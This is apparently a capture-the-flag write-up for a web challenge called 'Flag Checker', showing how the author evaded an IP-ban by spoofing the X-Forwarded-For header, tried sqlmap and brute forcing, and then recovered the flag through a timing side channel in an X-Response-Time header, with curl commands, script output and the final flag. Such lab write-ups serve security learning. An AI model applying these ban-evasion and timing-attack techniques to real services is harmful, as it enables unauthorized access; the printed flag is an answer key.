# Flag Checker

| Category | Author   |
| -------- | -------- |
| 🌐 Web   | @Soups71 |

> We've decided to make this challenge really straight forward. All you have to do is find out the flag!
> 
> Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...

> **NOTE**
> 
> Working this challenge may be difficult with the browser-based connection alone. We again recommend you use the direct IP address over the VPN connection.

> **IMPORTANT**
> 
> Restarting the instance repeatedly is not required for solving this challenge. If you find yourself doing this, it may be worth reevaluating your strategy.

As soon as you start bruteforcing the challenge, you get IP banned.
The only way to then continue is by resetting the VM.
Time throttling etc. doesn't work.

If you do a port-scan (or accidentaly have done a challenge prior where the Flask app was running at port 5000), you'll notice this app runs both on tcp/80 as tcp/5000.
The version running on port 5000 however, requires a `X-Forwarded-For` header.  
That may actually be in our advantage as this allows us to send random IP addresses on each request to avoid getting banned ourselves. Worst case, the random IP gets blocklisted.

Tried running with the `--tamper=xforwardedfor` but it didn't find anything, not even with max. `level` and `risk`

```sh
python3 sqlmap.py -u http://10.1.129.196:5000/submit?flag=123 -p flag --level=5 --risk 3 --tamper=xforwardedfor
```

I got lazy, so while doing another challenge, I decided to let a bruteforce script go wild (even though description mentions bruteforcing isn't required).
It's a very dumb script without threading or logic on MD5 hashing. I basically gave it an enourmous list of numbers to hash, hoping it might clash with the correct flag.

```sh
for ((i=0; $i<$((2 ** 32)); i++)); do ./brute.sh $i; done
```

Didn't get the flag :(

__Solution discovered thanks to hints:__

Based on hints, I managed to discover the solution.

Looking at the response headers, we see there's a `X-Response-Time` header that shows how long the server spent on analysing the flag we submitted.  
We don't even need to submit complete flags to see the behaviour.

```sh
$ curl -I 'http://10.1.90.89:5000/submit?flag=flag%7Ba' -H 'X-Forwarded-For: 127.0.0.1'
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.14
Date: Mon, 03 Nov 2025 18:57:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
X-Response-Time: 0.504479
Connection: close

$ curl -I 'http://10.1.90.89:5000/submit?flag=flag%7B6' -H 'X-Forwarded-For: 127.0.0.6' 2>/dev/null | grep X-Response-Time
X-Response-Time: 0.501712

$ curl -I 'http://10.1.90.89:5000/submit?flag=flag%7B7' -H 'X-Forwarded-For: 127.0.0.7' 2>/dev/null | grep X-Response-Time
X-Response-Time: 0.601807

$ curl -I 'http://10.1.90.89:5000/submit?flag=flag%7B9' -H 'X-Forwarded-For: 127.0.0.9' 2>/dev/null | grep X-Response-Time
X-Response-Time: 0.501804
```

Let's try to automate this based on the following rules:

- make a GET request to `http://10.1.90.89:5000/submit?flag=[OUR_FLAG]`
- pass a random IP address via the `X-Forwarded-For` request header
- analyse the response time in the `X-Response-Time` response header
- start of with `flag{a` as value of `[OUR_FLAG]`, move on to `flag{b`, and so forth until we detect a response with a noticeably bigger response time (let's say 0.05 or more)
- after finding the correct first character, move on to the second character. The response time baseline should now based on the response time for the correct first character
- stop when we get a 32-character flag, matching the `flag\{[0-9a-f]{32}\}` flag format

This does take a while to finish.
I guess you could calculate the average duration based on the fact that we need to find 32 characters with on average 8 attempts (16/2) per character, the response time starts at 0.5 seconds and increases with 0.1s for each consecutive character.
I should've (asked ChatGPT to) added multithreading of some sorts here...

```sh
$ python3 flagfinder.py 
Starting timing attack. This may send many requests. Press Ctrl-C to stop.
[+] Baseline for 'flag{': 0.501708
[+] Recovering char 1/32 (current: flag{)
    - try 'a': X-Response-Time=0.501878 (baseline 0.501708)
    - try 'b': X-Response-Time=0.502278 (baseline 0.501708)
    # ...
    - try '6': X-Response-Time=0.501738 (baseline 0.501708)
    - try '7': X-Response-Time=0.601967 (baseline 0.501708)
[+] Found char #1: '7' -> new prefix: flag{7...
[+] Recovering char 2/32 (current: flag{7)
    - try 'a': X-Response-Time=0.601832 (baseline 0.601967)
    - try 'b': X-Response-Time=0.60181 (baseline 0.601967)
    # ...
    - try '6': X-Response-Time=0.601931 (baseline 0.601967)
    - try '7': X-Response-Time=0.701938 (baseline 0.601967)
[+] Found char #2: '7' -> new prefix: flag{77...
[+] Recovering char 3/32 (current: flag{77)
    - try 'a': X-Response-Time=0.701978 (baseline 0.701938)
    - try 'b': X-Response-Time=0.802041 (baseline 0.701938)
[+] Found char #3: 'b' -> new prefix: flag{77b...
# ...
[+] Recovering char 32/32 (current: flag{77ba0346d9565e77344b9fe40ecf136)
    - try 'a': X-Response-Time=3.605671 (baseline 3.605775)
    - try 'b': X-Response-Time=3.60538 (baseline 3.605775)
    # ...
    - try '8': X-Response-Time=3.605598 (baseline 3.605775)
    - try '9': X-Response-Time=3.706042 (baseline 3.605775)
[+] Found char #32: '9' -> new prefix: flag{77ba0346d9565e77344b9fe40ecf1369
[+] Recovered (partial/full) flag: flag{77ba0346d9565e77344b9fe40ecf1369}
Result: flag{77ba0346d9565e77344b9fe40ecf1369}
```

`flag{77ba0346d9565e77344b9fe40ecf1369}`
